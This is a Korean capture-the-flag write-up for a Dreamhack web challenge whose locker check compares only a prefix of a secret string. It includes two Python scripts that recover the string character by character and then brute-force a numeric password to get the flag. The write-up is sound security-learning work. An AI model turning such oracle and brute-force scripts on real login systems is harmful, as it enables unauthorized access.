created: 2026-01-19 19:47
category: #web 
link: https://dreamhack.io/wargame/challenges/931

# Write-up
```python
rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)
```
- 먼저 `rand_str`은 알파벳 소문자와 숫자로 이루어진 4자리 문자열이다.  
- `rand_num`은 100 ~ 200중 랜덤으로 선택된 값이다.

```python
locker_num = request.form.get("locker_num", "")
password = request.form.get("password", "")

if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
	if locker_num == rand_str and password == str(rand_num):
		return render_template("index.html", result = "FLAG:" + FLAG)
	return render_template("index.html", result = "Good")
else: 
	return render_template("index.html", result = "Wrong!")
```
- 먼저 `locker_num`과 `rand_str`을 비교하는 데 여기서 취약점이 존재한다. `rand_str[0:len(locker_num)] == locker_num`으로 되어 있어서 `locker_num`을 한 자리의 문자열로 전송해서 `rand_str`의 각 4자리 수들을 하나하나씩 알아낼 수 있겠다고 생각했다. 
- `rand_str`을 알아낸다면, `rand_num`은 간단하게 브루트 포스로 알아낼 수 있다.

```python
import http.client
import string

conn = http.client.HTTPConnection("host8.dreamhack.games", 17199)

headers = {"Content-type": "application/x-www-form-urlencoded"}

locker_num = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    for c in alphanumeric:
        params = f"locker_num={locker_num + c}&password=1234"
        conn.request("POST", "/", params, headers)
        response = conn.getresponse()
        data = response.read().decode()
        if "Good" in data:
            locker_num += c
            break

print(f"Found locker_num: {locker_num}")

conn.close()
```
- 위와 같이 `rand_str`(`locker_num`)을 알아내기 위한 파이썬 코드를 작성하였다. 길이가 4인 `rand_str`의 각 자리 문자별로 소문자 알파벳과 숫자들을 모두 보내서 원본 값을 알아낸다. 

```python
import http.client
import string

conn = http.client.HTTPConnection("host8.dreamhack.games", 17199)

headers = {"Content-type": "application/x-www-form-urlencoded"}

locker_num = "임의의 값"

for i in range(100, 201):
    params = f"locker_num={locker_num}&password={i}"
    conn.request("POST", "/", params, headers)
    response = conn.getresponse()
    data = response.read().decode()
    if "FLAG" in data:
        print(f"Found password: {i}")
        break

conn.close()
```
- 그리고 `locker_num`을 알아냈다면, 브루트 포스를 통해 `password` 값까지 알아낸다. 

![[Pasted image 20260119195633.png|700]]
이후 알아낸 `locker_num`과 `password` 값을 전송하여 플래그 값을 획득할 수 있었다.

# Reference
